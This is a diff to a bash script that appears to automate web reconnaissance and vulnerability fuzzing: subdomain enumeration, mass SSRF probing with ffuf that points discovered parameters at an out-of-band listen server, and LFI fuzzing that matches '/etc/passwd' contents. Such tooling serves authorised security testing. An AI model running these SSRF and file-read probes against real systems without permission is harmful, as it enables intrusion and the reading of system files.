@@ -298,7 +298,7 @@ checkhttprobe(){
             mapcidr -silent -cidr $CIDR1 | dnsx -silent -resp-only -ptr | grep $1 | sort | uniq | tee $TARGETDIR/dnsprobe_ptr.txt | \
                 puredns -q -r $MINIRESOLVERS resolve --wildcard-batch 100000 -l 5000 | \
                 dnsx -silent -r $MINIRESOLVERS -a -resp-only | tee -a $TARGETDIR/dnsprobe_ip.txt | tee $TARGETDIR/dnsprobe_ip_mode.txt | \
-                $httpxcall >> $TARGETDIR/3-all-subdomain-live-scheme.txt
+                $httpxcall | tee $TARGETDIR/httpx_ip_mode.txt >> $TARGETDIR/3-all-subdomain-live-scheme.txt
 
             # sort new assets
             sort -u $TARGETDIR/dnsprobe_ip.txt  -o $TARGETDIR/dnsprobe_ip.txt 
@@ -514,7 +514,7 @@ custompathlist(){
 
     echo "[$(date | awk '{ print $4}')] Prepare custom customSsrfQueryList"
     # https://github.com/tomnomnom/gf/issues/55
-    xargs -P 20 -n 1 -I {} grep -oiaE "(([[:alnum:][:punct:]]+)+)?{}=" $queryList < $PARAMSLIST >> $customSsrfQueryList || true &
+    xargs -P 20 -n 1 -I {} grep -oiaE "(([[:alnum:][:punct:]]+)+)?{}=" $queryList < $PARAMSLIST | sed '/^[^h]/d' >> $customSsrfQueryList || true &
     pid_01=$!
     wait $pid_01
 
@@ -563,28 +563,22 @@ ssrftest(){
                          -mode pitchfork < $PARAMSLIST > /dev/null
     echo "[$(date | awk '{ print $4}')] [SSRF-2] done."
     echo
+    if [[ -s "$customSsrfQueryList" ]]; then
+      echo "[$(date | awk '{ print $4}')] [SSRF-3] fuzz original endpoints from wayback and fetched data"
+      ENDPOINTCOUNT=$(< $customSsrfQueryList wc -l)
+      echo "requests count = $ENDPOINTCOUNT"
+          ffuf -s -timeout 1 -ignore-body -t 500 -u HOST${LISTENSERVER} -w $customSsrfQueryList:HOST > /dev/null
+      echo "[$(date | awk '{ print $4}')] [SSRF-3] done."
+      echo
+    fi
+
     if [ -s "$TARGETDIR/ssrf-path-list.txt" ]; then
       # similar to paramspider but all wayback without limits
-      echo "[$(date | awk '{ print $4}')] [SSRF-3] prepare ssrf-list: concat .com?params= out with listen server..."
-
-      while read line; do
-        echo "${line}${LISTENSERVER}" >> $TARGETDIR/ssrf-original-list.txt
-      done < $customSsrfQueryList
+      echo "[$(date | awk '{ print $4}')] [SSRF-3] prepare ssrf-list: concat .com?params= with listen server..."
 
       while read line; do
         echo "${line}${LISTENSERVER}" >> $TARGETDIR/ssrf-list.txt
       done < $TARGETDIR/ssrf-path-list.txt
-
-      echo "[$(date | awk '{ print $4}')] [SSRF-3] fuzz original endpoints from wayback and fetched data"
-      ENDPOINTCOUNT=$(< $TARGETDIR/ssrf-original-list.txt wc -l)
-      echo "requests count = $ENDPOINTCOUNT"
-          ffuf -s -timeout 1 -ignore-body -t 500 -u HOST -w $TARGETDIR/ssrf-original-list.txt:HOST > /dev/null
-      echo "[$(date | awk '{ print $4}')] [SSRF-3] done."
-      echo
-      # echo "[$(date | awk '{ print $4}')] [SSRF-4] fuzz using X-headers with original endpoints from wayback and fetched data"
-          # ssrf-headers-tool $TARGETDIR/ssrf-original-list.txt $LISTENSERVER > /dev/null
-      # echo "[$(date | awk '{ print $4}')] [SSRF-4] done."
-      echo
 
       echo "[$(date | awk '{ print $4}')] [SSRF-5] fuzz all live servers with ssrf-list"
       # simple math to watch progress
@@ -618,7 +612,7 @@ lfitest(){
              -w $LFIPAYLOAD:PATH \
              -mr "root:[x*]:0:0:" \
              -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36" \
-             -o $TARGETDIR/ffuf/lfi-matched-url.txt -or true > /dev/null
+             -o $TARGETDIR/ffuf/lfi-matched-url.html -of html -or true > /dev/null
     echo "[$(date | awk '{ print $4}')] [LFI] done."
   fi
 }
@@ -823,30 +817,29 @@ main(){
 
 
   # merges gospider and page-fetch outputs
-  queryList=$TARGETDIR/query_list.txt
+  queryList=$TARGETDIR/tmp/query_list.txt
   touch $queryList
   # scope filtered list
-  rawList=$TARGETDIR/custom_list.txt
+  rawList=$TARGETDIR/tmp/custom_list.txt
   touch $rawList
 
   if [[ -n "$fuzz" || -n "$brute" ]]; then
     mkdir $TARGETDIR/ffuf/
     mkdir $TARGETDIR/gospider/
     mkdir $TARGETDIR/page-fetched/
-    touch $TARGETDIR/gospider/gospider_out.txt
     touch $TARGETDIR/page-fetched/pagefetcher_output.txt
   fi
 
   # used for fuzz and bruteforce
   if [[ -n "$fuzz" ]]; then
     # to work with gf ssrf output
-    customSsrfQueryList=$TARGETDIR/custom_ssrf_list.txt
+    customSsrfQueryList=$TARGETDIR/tmp/custom_ssrf_list.txt
     touch $customSsrfQueryList
     # to work with gf lfi output
-    customLfiQueryList=$TARGETDIR/custom_lfi_list.txt
+    customLfiQueryList=$TARGETDIR/tmp/custom_lfi_list.txt
     touch $customLfiQueryList
     # to work with gf ssrf output
-    customSqliQueryList=$TARGETDIR/custom_sqli_list.txt
+    customSqliQueryList=$TARGETDIR/tmp/custom_sqli_list.txt
     touch $customSqliQueryList
   fi
 
